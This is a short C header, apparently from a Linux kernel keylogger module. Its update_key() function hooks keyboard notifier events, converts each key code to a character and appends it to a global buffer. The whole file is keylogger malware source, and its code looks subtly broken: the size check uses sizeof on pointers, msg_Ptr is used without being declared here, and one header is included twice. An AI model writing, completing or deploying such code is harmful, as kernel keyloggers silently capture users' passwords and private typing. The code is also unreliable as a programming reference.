#ifndef KEYLOGGER
#define KEYLOGGER
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include "keys.h"
#include "fops.c"
#define BUFF_SIZE 0x1000
char msg_Ptr_size[BUFF_SIZE];

void update_key(struct keyboard_notifier_param *p)
{
    char *tav;  
    if (p->shift){
        /*hundle as shift*/
        tav = keycode[p->value][1];
    }
    else
    {
        tav = keycode[p->value][0];
    }
    if(sizeof(msg_Ptr)+sizeof(tav) < sizeof(char)*BUFF_SIZE){
        msg_Ptr=strcat(msg_Ptr, tav);
    }
}
#endif